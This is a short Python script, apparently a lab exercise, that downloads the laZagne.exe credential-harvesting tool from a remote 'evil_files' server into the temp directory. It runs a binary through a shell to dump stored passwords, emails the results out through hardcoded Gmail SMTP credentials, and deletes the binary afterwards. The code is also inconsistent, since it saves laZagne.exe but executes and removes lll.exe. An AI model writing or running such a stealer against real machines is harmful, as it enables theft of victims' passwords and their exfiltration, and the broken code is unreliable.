#!usr/bin/env python3

import requests
import smtplib
import subprocess
import os
import tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    print(file_name)
    with open(file_name, "wb") as out_files:
        out_files.write(get_response.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_dir=tempfile.gettempdir()
os.chdir(temp_dir)
download("http://10.0.2.4/evil_files/laZagne.exe")
result=subprocess.check_output("lll.exe all",shell=True)
send_mail("myemail@myemail.com","mypassword",result)
os.remove("lll.exe")